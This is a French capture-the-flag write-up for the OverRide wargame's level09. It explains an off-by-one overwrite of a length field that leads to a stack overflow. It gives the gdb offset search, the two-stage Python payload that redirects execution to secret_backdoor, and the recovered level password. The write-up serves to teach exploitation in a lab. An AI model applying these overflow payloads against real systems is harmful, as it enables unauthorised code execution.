# level09

En ouvrant l'exécutable sur un décompileur, on voit rapidement la fonction `secret_backdoor`, on comprend donc qu'on va devoir y accéder via un overflow ou un string format.

Aucun printf en vue, on commence donc par explorer l'option de l'overflow.

Le programme nous propose de définir notre username et d'envoyer un message, `main` appelle `handle_msg` qui a un buffer `v1` d'une taille de `140`
Derrière la déclaration de `v1`, on push 5 `int64` sur la stack, donc `40 bytes`.
On a ensuite un int `v7` qui vaut `140`

`set_username` est appelé avec notre buffer `v1` en argument, il va lire `128 bytes` de notre input dans un buffer de `140` caractères, donc pas d'overflow ici.

En revanche, on a ensuite cette boucle:

```C
for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];
```

La condition `i <= 40` nous fait comprendre que l'on peut copier jusqu'à `41 bytes` dans `a1 + 140`, on avait noté plus haut qu'il n'y avait que `40 bytes` allouées à la suite de `a1`, le 41ème byte que l'on peut copier va donc overflow le premier byte de `v7`, l'int qui vaut `140` dans `handle_msg`.

`handle_msg` appelle ensuite `set_msg`, qui va prendre notre input pour définir le message, et appeler ensuite `strncpy` de cette manière:

```C
return strncpy((char *)a1, s, *(int *)(a1 + 180));
```

Le 3ème argument de `strncpy` est le nombre de bytes qui vont etre copiés, ici, on utilise la valeur située à `a1 + 180`, donc `v7`. Hors on a noté précédemment qu'il était possible d'overflow le premier byte de `v7` et donc d'augmenter considérablement sa valeur.

Ici, notre `strncpy` va copier notre input dans `a1` (`v1` de `handle_msg`) derrière `a1`, on sait qu'on a nos 4 `int64` donc `40 bytes`, et la déclaration de `v7` donc `4 bytes`, ce qui nous fait un total de `184 bytes` allouées.

On doit donc utiliser `set_username` pour overflow la valeur de `v7`, puis utiliser `set_msg` pour écrire l'adresse de `secret_backdoor` en dehors de la memoire allouée.

Petit coup de pattern generator pour trouver l'offset 

```sh
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) run < <(python -c 'print("a" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level09/level09 < <(python -c 'print("a" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info registers
rax            0xd	13
rbx            0x0	0
rcx            0x7ffff7b01f90	140737348902800
rdx            0x7ffff7dd5a90	140737351867024
rsi            0x7ffff7ff7000	140737354100736
rdi            0xffffffff	4294967295
rbp            0x6741356741346741	0x6741356741346741
rsp            0x7fffffffe5d8	0x7fffffffe5d8
r8             0x7ffff7ff7004	140737354100740
r9             0xc	12
r10            0x7fffffffde80	140737488346752
r11            0x246	582
r12            0x555555554790	93824992233360
r13            0x7fffffffe6c0	140737488348864
r14            0x0	0
r15            0x0	0
rip            0x555555554931	0x555555554931 <handle_msg+113>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```

On trouve un offset de `192` pour écrire

On ajoute 8 pour arriver à `rsp` (voir [source](https://blog.zenika.com/2020/06/24/exploitation-stack-buffer-overflow-return-oriented-programming-la-theorie/)), ce qui nous donne un offset de 200

Derrière notre offset de 200, on va mettre les 4 derniers bytes de l'addresse de `secret_backdoor` (le reste de bytes étant déjà identique, pas besoin de les réécrire).

Ce qui nous donne:

```sh
python -c 'print(b"\xca" * 45)' > /tmp/first

python -c 'print("A" * 200 + "\x8c\x48")' > /tmp/second
```

```bash
level09@OverRide:~$ cat /tmp/second - | cat /tmp/first - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```